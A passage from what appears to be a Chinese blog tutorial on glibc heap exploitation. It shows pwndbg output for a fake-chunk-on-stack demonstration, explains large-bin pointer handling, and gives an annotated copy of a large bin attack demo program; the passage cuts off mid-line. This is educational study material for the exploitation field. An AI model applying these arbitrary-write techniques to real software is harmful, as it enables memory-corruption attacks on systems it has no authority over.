class="hljs-number">32</span>;<br>  <span class="hljs-number">26</span>   victim[<span class="hljs-number">1</span>] = (<span class="hljs-type">intptr_t</span>)stack_buffer; <span class="hljs-comment">// victim-&gt;bk is pointing to stack</span><br>  <span class="hljs-number">27</span>   <span class="hljs-comment">//------------------------------------</span><br>  <span class="hljs-number">28</span><br>► <span class="hljs-number">29</span>   <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now next malloc will return the region of our fake chunk: %p\n&quot;</span>, &amp;stack_buffer[<span class="hljs-number">2</span>]);<br><br><br>► <span class="hljs-number">30</span>   <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;malloc(0x100): %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>));<br>  <span class="hljs-number">31</span> &#125;<br></code></pre></td></tr></table></figure><p>好了,下面开始运行一下,先分配两个指针</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span><br>0x602000 PREV_INUSE &#123;<br>  prev_size = 0,<br>  size = 273,<br>  fd = 0x0,<br>  bk = 0x0,<br>  fd_nextsize = 0x0,<br>  bk_nextsize = 0x0<br>&#125;<br>0x602110 PREV_INUSE &#123;<br>  prev_size = 0,<br>  size = 273,<br>  fd = 0x0,<br>  bk = 0x0,<br>  fd_nextsize = 0x0,<br>  bk_nextsize = 0x0<br>&#125;<br>0x602220 PREV_INUSE &#123;<br>  prev_size = 0,<br>  size = 134625,<br>  fd = 0x0,<br>  bk = 0x0,<br>  fd_nextsize = 0x0,<br>  bk_nextsize = 0x0<br>&#125;<br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">p/x stack_buffer</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">1 = &#123;0x0, 0x0, 0x0, 0x0&#125;</span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">p/x &amp;stack_buffer</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">2 = 0x7fffffffe5b0</span><br></code></pre></td></tr></table></figure><p>之后我们free掉victim,此时</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; bins<br><span class="hljs-attribute">fastbins</span><br><span class="hljs-attribute">0x20</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x30</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x40</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x50</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x60</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x70</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x80</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">unsortedbin</span><br><span class="hljs-attribute">all</span>: <span class="hljs-number">0</span>x602000 —▸ <span class="hljs-number">0</span>x7ffff7dd1b78 (main_arena+<span class="hljs-number">88</span>) ◂— <span class="hljs-number">0</span>x602000<br><span class="hljs-attribute">smallbins</span><br><span class="hljs-attribute">empty</span><br><span class="hljs-attribute">largebins</span><br><span class="hljs-attribute">empty</span><br></code></pre></td></tr></table></figure><p>然后我们修改一下栈的布局</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; x/<span class="hljs-number">10</span>gx stack_buffer<br><span class="hljs-attribute">0x7fffffffe5b0</span>: <span class="hljs-number">0</span>x0000000000000000      <span class="hljs-number">0</span>x0000000000000110<br><span class="hljs-attribute">0x7fffffffe5c0</span>: <span class="hljs-number">0</span>x0000000000000000      <span class="hljs-number">0</span>x00007fffffffe5b0<br><span class="hljs-attribute">0x7fffffffe5d0</span>: <span class="hljs-number">0</span>x00007fffffffe6c0      <span class="hljs-number">0</span>xae78811595436300<br><span class="hljs-attribute">0x7fffffffe5e0</span>: <span class="hljs-number">0</span>x0000000000400870      <span class="hljs-number">0</span>x00007ffff7a2d830<br><span class="hljs-attribute">0x7fffffffe5f0</span>: <span class="hljs-number">0</span>x0000000000000000      <span class="hljs-number">0</span>x00007fffffffe6c8<br></code></pre></td></tr></table></figure><p>此时我们已经伪造了一个fake chunk,紧接着再覆写victim的size和bk指针</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs dns">pwndbg&gt; x/<span class="hljs-number">10</span>gx victim-<span class="hljs-number">2</span><br><span class="hljs-number">0x602000</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000020</span><br><span class="hljs-number">0x602010</span>:       <span class="hljs-number">0</span>x00007ffff7dd1b78      <span class="hljs-number">0</span>x00007fffffffe5b0<br><span class="hljs-number">0x602020</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602030</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602040</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br>pwndbg&gt; heap<br><span class="hljs-number">0x602000</span> &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">32</span>,<br>  fd = <span class="hljs-number">0</span>x7ffff7dd1b78 &lt;main_arena+<span class="hljs-number">88</span>&gt;,<br>  bk = <span class="hljs-number">0</span>x7fffffffe5b0,<br>  fd_nextsize = <span class="hljs-number">0</span>x0,<br>  bk_nextsize = <span class="hljs-number">0</span>x0<br>&#125;<br><span class="hljs-number">0x602020</span> &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">0</span>,<br>  fd = <span class="hljs-number">0</span>x0,<br>  bk = <span class="hljs-number">0</span>x0,<br>  fd_nextsize = <span class="hljs-number">0</span>x0,<br>  bk_nextsize = <span class="hljs-number">0</span>x0<br>&#125;<br>pwndbg&gt; bins<br>fastbins<br><span class="hljs-number">0</span>x20: <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span>x30: <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span>x40: <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span>x50: <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span>x60: <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span>x70: <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span>x80: <span class="hljs-number">0</span>x0<br>unsortedbin<br>all [corrupted]<br>FD: <span class="hljs-number">0x602000</span> —▸ <span class="hljs-number">0</span>x7ffff7dd1b78 (main_arena+<span class="hljs-number">88</span>) ◂— <span class="hljs-number">0x602000</span><br>BK: <span class="hljs-number">0x602000</span> —▸ <span class="hljs-number">0</span>x7fffffffe5b0 ◂— <span class="hljs-number">0</span>x7fffffffe5b0<br>smallbins<br>empty<br>largebins<br>empty<br></code></pre></td></tr></table></figure><p>由于刚刚的更改，我们的fake chunk已经被系统认为是链入到unsorted bin中的，所以最后malloc一下就可以返回我们的fake_chunk了</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs nix">pwndbg<span class="hljs-operator">&gt;</span> heap<br><span class="hljs-number">0</span>x602000 &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">32</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x7ffff7dd1b88 <span class="hljs-operator">&lt;</span>main_arena<span class="hljs-operator">+</span><span class="hljs-number">104</span><span class="hljs-operator">&gt;</span>,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x7ffff7dd1b88 <span class="hljs-operator">&lt;</span>main_arena<span class="hljs-operator">+</span><span class="hljs-number">104</span><span class="hljs-operator">&gt;</span>,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br><span class="hljs-number">0</span>x602020 &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br>pwndbg<span class="hljs-operator">&gt;</span> bins<br>fastbins<br><span class="hljs-number">0</span><span class="hljs-params">x20:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x30:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x40:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x50:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x60:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x70:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x80:</span> <span class="hljs-number">0</span>x0<br>unsortedbin<br>all [corrupted]<br><span class="hljs-params">FD:</span> <span class="hljs-number">0</span>x602000 —▸ <span class="hljs-number">0</span>x7ffff7dd1b88 (main_arena<span class="hljs-operator">+</span><span class="hljs-number">104</span>) ◂— <span class="hljs-number">0</span>x602000<br><span class="hljs-params">BK:</span> <span class="hljs-number">0</span>x7fffffffe5b0 ◂— <span class="hljs-number">0</span>x7fffffffe5b0<br>smallbins<br><span class="hljs-number">0</span><span class="hljs-params">x20:</span> <span class="hljs-number">0</span>x602000 —▸ <span class="hljs-number">0</span>x7ffff7dd1b88 (main_arena<span class="hljs-operator">+</span><span class="hljs-number">104</span>) ◂— <span class="hljs-number">0</span>x602000<br>largebins<br>empty<br></code></pre></td></tr></table></figure><p>可以看到，我们之前的free bins被放进了small bin中</p><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>程序先是在栈上定义了一个数组</p><p>随即分配了两个大小为0x100的chunk vitcim和chunk p1</p><p>紧接着释放了victim把他放进了unsorted bin中，之后在栈上伪造了一个fake chunk</p><p>最后修改了victim的Size和bk指针，将我们的fake chunk链入我们的unsorted bin中</p><p>此时我们再malloc一个合适大小的chunk就可以在我们的栈上malloc出来了</p><h1 id="large-bin-attack"><a href="#large-bin-attack" class="headerlink" title="large bin attack"></a>large bin attack</h1><h2 id="序-2"><a href="#序-2" class="headerlink" title="序"></a>序</h2><p>对于本例很少有遇到过,而且对于large bin attack的利用研究任重而道远,而且在glibc2.29中large bin attack 更是大不相同</p><p>在开始之前我一定要说一句,对glibc分配机制不熟悉的建议还是多看看(或者直接去看glibc2.29的内容,毕竟要紧跟时代潮流嘛,现在glibc2.29的题目也越来越多了</p><p>我们先看看例子中拿出来的部分</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs xl">[...]<br>          <span class="hljs-keyword">else</span><br>          &#123;<br>              <span class="hljs-function"><span class="hljs-title">victim</span>-&gt;</span>fd_nextsize = fwd;<br>              <span class="hljs-function"><span class="hljs-title">victim</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">bk_nextsize</span> = fwd-&gt;</span>bk_nextsize;<br>              <span class="hljs-function"><span class="hljs-title">fwd</span>-&gt;</span>bk_nextsize = victim;<br>              <span class="hljs-function"><span class="hljs-title">victim</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">bk_nextsize</span>-&gt;</span>fd_nextsize = victim;<br>          &#125;<br>          <span class="hljs-function"><span class="hljs-title">bck</span> = fwd-&gt;</span>bk;<br>[...]<br>mark_bin (av, victim_index);<br><span class="hljs-function"><span class="hljs-title">victim</span>-&gt;</span>bk = bck;<br><span class="hljs-function"><span class="hljs-title">victim</span>-&gt;</span>fd = fwd;<br><span class="hljs-function"><span class="hljs-title">fwd</span>-&gt;</span>bk = victim;<br><span class="hljs-function"><span class="hljs-title">bck</span>-&gt;</span>fd = victim;<br>For more details on how large-bins are handled <span class="hljs-built_in">and</span> sorted <span class="hljs-keyword">by</span> ptmalloc,<br>please check the Background section <span class="hljs-built_in">in</span> the aforementioned link.<br></code></pre></td></tr></table></figure><p>这里推荐作者给出的<a href="https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/">链接</a></p><p>当然,我在这里简单说一哈</p><p>我们的large bin管理free 掉的 chunk时,我们的bk_nextsize和fd_nextsize就启用了</p><p>large bin是双循环链表,对于同样大小的free chunk我们所释放的第一个chunk会成为一个堆头,其bk_nextsize指向下一个比他大的堆头,而fd_nextsize指向下一个比他小的堆头,然后最大的堆头的bk_nextsize指向最小的堆头,最小的堆头的fd_nextsize指向最大的堆头,而剩下的free chunk就会通过fd和bk指针链在堆头的下面,他们的fd_nextsize和bk_nextsize的值都为0</p><p>形状的话就像是多个chunk按大小(从大到小)围成一个圆(最大最小相接),而每一个chunk的后面都链着一排和他一样大小的chunk</p><p>那我们如何利用呢?</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">victim</span>-&gt;</span>fd_nextsize = fwd;<br><span class="hljs-function"><span class="hljs-title">victim</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">bk_nextsize</span> = fwd-&gt;</span>bk_nextsize;<br><span class="hljs-function"><span class="hljs-title">fwd</span>-&gt;</span>bk_nextsize = victim<br><span class="hljs-function"><span class="hljs-title">victim</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">bk_nextsize</span>-&gt;</span>fd_nextsize=victim<br><br><span class="hljs-function"><span class="hljs-title">bck</span> = fwd-&gt;</span>bk;<br><br>mark_bin (av, victim_index)<br><span class="hljs-function"><span class="hljs-title">victim</span>-&gt;</span>bk = bck;<br><span class="hljs-function"><span class="hljs-title">victim</span>-&gt;</span>fd = fwd;<br><span class="hljs-function"><span class="hljs-title">fwd</span>-&gt;</span>bk = victim;<br><span class="hljs-function"><span class="hljs-title">bck</span>-&gt;</span>fd = victim;<br></code></pre></td></tr></table></figure><p>而这个过程中,我们的fwd是可控的,而又因为我们的fwd可控,也就意味着我们的fwd-&gt;bk_nextsize可控,bck可控 </p><p>因此我们在这个过程中就有两次任意地址写堆地址的能力</p><p>第一次在victim-&gt;bk_nextsize也就是victim+4的地方</p><p>第二次在victim-&gt;bk&#x3D;bck&#x3D;fwd-&gt;bk的地方,也就是victim+2的地方</p><p>这两个地方可以写入fwd-&gt;bk_nextsize和fwd-&gt;bk</p><h2 id="源代码-2"><a href="#源代码-2" class="headerlink" title="源代码"></a>源代码</h2><p>这里我就一行也不删了,直接在上面加了一小点注释</p><p>如果想了解large bin的话,可以去源代码给出的链接中看看</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/*</span><br><span class="hljs-comment">    This technique is taken from</span><br><span class="hljs-comment">    https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/</span><br><span class="hljs-comment">    [...]</span><br><span class="hljs-comment">              else</span><br><span class="hljs-comment">              &#123;</span><br><span class="hljs-comment">                  victim-&gt;fd_nextsize = fwd;</span><br><span class="hljs-comment">                  victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="hljs-comment">                  fwd-&gt;bk_nextsize = victim;</span><br><span class="hljs-comment">                  victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="hljs-comment">              &#125;</span><br><span class="hljs-comment">              bck = fwd-&gt;bk;</span><br><span class="hljs-comment">    [...]</span><br><span class="hljs-comment">    mark_bin (av, victim_index);</span><br><span class="hljs-comment">    victim-&gt;bk = bck;</span><br><span class="hljs-comment">    victim-&gt;fd = fwd;</span><br><span class="hljs-comment">    fwd-&gt;bk = victim;</span><br><span class="hljs-comment">    bck-&gt;fd = victim;</span><br><span class="hljs-comment">    For more details on how large-bins are handled and sorted by ptmalloc,</span><br><span class="hljs-comment">    please check the Background section in the aforementioned link.</span><br><span class="hljs-comment">    [...]</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br> <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//本例以通过写一个大的无符号long型数值进入栈来演示large bin attack</span><br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;This file demonstrates large bin attack by writing a large unsigned long value into stack\n&quot;</span>);<br>    <span class="hljs-comment">//在实际中,large bin attack也常常被用于更深层次的攻击,如覆写global_max_fast来为fastbin attack打辅助(为什么有一种看到了unsorted bin attack的错觉2333</span><br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;In practice, large bin attack is generally prepared for further attacks, such as rewriting the &quot;</span><br>           <span class="hljs-string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var1 = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var2 = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">//我们要在栈上覆写的是stack_var1和stack_var2</span><br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Let&#x27;s first look at the targets we want to rewrite on stack:\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;stack_var1 (%p): %ld\n&quot;</span>, &amp;stack_var1, stack_var1);<br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;stack_var2 (%p): %ld\n\n&quot;</span>, &amp;stack_var2, stack_var2);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x320</span>);<br>    <span class="hljs-comment">//现在我们有了第一个large chunk</span><br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now, we allocate the first large chunk on the heap at: %p\n&quot;</span>, p1 - <span class="hljs-number">2</span>);<br><br>    <span class="hljs-comment">//然后申请一个fastbin chunk 来避免我们的第一个large chunk free的时候与下一个large chunk合并</span><br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span><br>           <span class="hljs-string">&quot; the first large chunk during the free()\n\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<br>    <span class="hljs-comment">//现在是第二个large chunk</span><br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Then, we allocate the second large chunk on the heap at: %p\n&quot;</span>, p2 - <span class="hljs-number">2</span>);<br><br>    <span class="hljs-comment">//同理,防止第二个free的时候与下一个large chunk合并</span><br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span><br>           <span class="hljs-string">&quot; the second large chunk during the free()\n\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br>    <br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<br>    <span class="hljs-comment">//最后我们分配第三个large chunk</span><br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Finally, we allocate the third large chunk on the heap at: %p\n&quot;</span>, p3 - <span class="hljs-number">2</span>);<br>    <br>    <span class="hljs-comment">//这个fastbin是为了防止和top chunk合并</span><br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;And allocate another fastbin chunk in order to avoid consolidating the top chunk with&quot;</span><br>           <span class="hljs-string">&quot; the third large chunk during the free()\n\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br> <br>    <span class="hljs-built_in">free</span>(p1);<br>    <span class="hljs-built_in">free</span>(p2);<br>    <span class="hljs-comment">//现在我们free掉第一个和第二个large chunks,此时他们会被插入到unsorted bin中</span><br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;We free the first and second large chunks now and they will be inserted in the unsorted bin:&quot;</span><br>           <span class="hljs-string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>, (<span class="hljs-type">void</span> *)(p2 - <span class="hljs-number">2</span>), (<span class="hljs-type">void</span> *)(p2[<span class="hljs-number">0</span>]));<br><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br>    <span class="hljs-comment">//此时,我们申请一个小于被释放的第一个large chunk的chunk</span><br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the&quot;</span><br>            <span class="hljs-string">&quot; freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation&quot;</span><br>            <span class="hljs-string">&quot;, and reinsert the remaining of the freed first large chunk into the unsorted bin:&quot;</span><br>            <span class="hljs-string">&quot; [ %p ]\n\n&quot;</span>, (<span class="hljs-type">void</span> *)((<span class="hljs-type">char</span> *)p1 + <span class="hljs-number">0x90</span>));<br><br>    <span class="hljs-built_in">free</span>(p3);<br>    <span class="hljs-comment">//现在我们free第三个large chunk</span><br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now, we free the third large chunk and it will be inserted in the unsorted bin:&quot;</span><br>           <span class="hljs-string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>, (<span class="hljs-type">void</span> *)(p3 - <span class="hljs-number">2</span>), (<span class="hljs-type">void</span> *)(p3[<span class="hljs-number">0</span>]));<br> <br>    <span class="hljs-comment">//------------VULNERABILITY-----------</span><br><br>    <span class="hljs-comment">//现在假设我们有一个漏洞可以覆写被free的第二个large chunk的size,bk,bk_nextsize指针</span><br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now emulating a vulnerability that can overwrite the freed second large chunk&#x27;s \&quot;size\&quot;&quot;</span><br>            <span class="hljs-string">&quot; as well as its \&quot;bk\&quot; and \&quot;bk_nextsize\&quot; pointers\n&quot;</span>);<br><br>    <span class="hljs-comment">//现在我们减少被free的第二个large chunk来逼迫malloc将被free的第三个large chunk插入到large bin freelist的头部</span><br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Basically, 